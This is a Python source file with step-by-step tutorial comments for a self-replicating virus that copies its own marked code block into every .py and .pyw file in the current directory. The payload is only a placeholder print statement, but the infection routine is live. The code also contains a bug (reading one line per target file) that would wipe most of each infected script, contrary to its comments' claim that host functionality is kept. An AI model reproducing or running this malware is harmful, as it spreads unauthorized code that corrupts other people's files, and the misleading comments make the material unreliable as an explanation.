### START OF VIRUS ###
import sys
import glob

'''
Getting the code of current file in a list
'''
code = []
'''
Open the current file.
We don't wanna pass a static file name because, we're not going to use this file only. 
This code we are writing right now is going to be injected in every other python script as well.
So it should be able to dynamically get file name.
Which means that we're going to pass sys.argv[0] 
Which is actually the file name that the current script has
And we're going to open that file in reading mode 
'''
with open(sys.argv[0], 'r') as f:
    '''
    Save all the code lines as f.readlines()
    '''
    lines = f.readlines()

'''
We are going to find the virus area. Because we don't wanna replicate all the code. When we inject future scripts we don't wanna copy all of their functionality & inject it into other scripts. We wanna inject only the virus code into other scripts.
So we create a virus_area that's the indicator that were inside or outside of the virus area. We'll start with False because we are not in the virus area.'''
virus_area = False
'''
And we filter out the virus code.
We look for the starting tag, copy the code in between & then we stop iterating over the lines, once we reach the end tag
'''
for line in lines:
    '''
    If the line that we're at right now happens to be START tag.
    And we are going to add a backslash n here because, when we use the read lines function it's going to have that.
        If that is the case we're now getting into virus area, so virus_area is True 
    '''
    if line == "### START OF VIRUS ###\n":
        virus_area = True
    '''
    >>in next iteration.
    If the virus_area is True.
        So if we're in the virus area we're going to append the line in the code.
    '''
    if virus_area:
        code.append(line)
    '''
    If we stumble upon the line which has the content END tag.
        then get out of the loop.
    '''
    if line == "### END OF VIRUS ###\n":
        break

''' 
Now we wanna find the python scripts that are in current directory & go ahead & infect those.
So first we're going to use glob module here in order to find all the scripts that python scripts.
For this we specify pattern & this pattern is going to be * so everything or anything .py
And then we add second category of files +glob.glob('*.pyw')
Those are the python scripts that open without a console window, at least on windows. 
Those are the two file categories that we wanna have here 
And what we're going to end up with a list of file names that are python scripts.
'''
python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
#print(python_scripts)
'''
Now we're going to go through all those scripts. & first of all check if they're infected. & if they're not infected, infect them 
'''
for script in python_scripts:
    '''
    We're going to open up those scripts in reading mode as f
        we're going to get all the script code. 
    '''
    with open(script, 'r') as f:
        script_code = f.readline()

    '''
    Then we going to just assume naively that the file is not infected. & we're going to go through all the lines and keep the file as not infected unless we find proof that it's infected. 
    So unless we find the text START OF VIRUS. As long as we don't find the start of virus stack, we're going to assume that the file is not infected.
    '''
    infected = False
    for line in script_code:
        '''
        if we find START tag here 
            Then infected is true.
            Then we break
        '''
        if line == "### START OF VIRUS ###\n":
            infected = True
            break
    '''
    If it's not infected we're going to infect it.
        Then we're taking a empty list.
        & here we extend the virus code & the script code that we already have.
        & then we extend this list with a new line. If we don't add this new line here what happens sometimes is that we add the virus code and then append the actual script code at the end of the comment .
        & then extend the script_code with the final_code. Because we don't want the script to lose functionality. We want to keep the functionality but also self replicate and execute virus code. 
    '''
    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)
        '''
        Then we're open the script in writing mode this time
            & we're going to overwrite the whole script, with the final_code that we just generated. we're not going to append code.
        '''
        with open(script, 'w') as f:
            f.writelines(final_code)

'''
Malicious piece of code(Payload)
'''
print("hello World")

### END OF VIRUS ###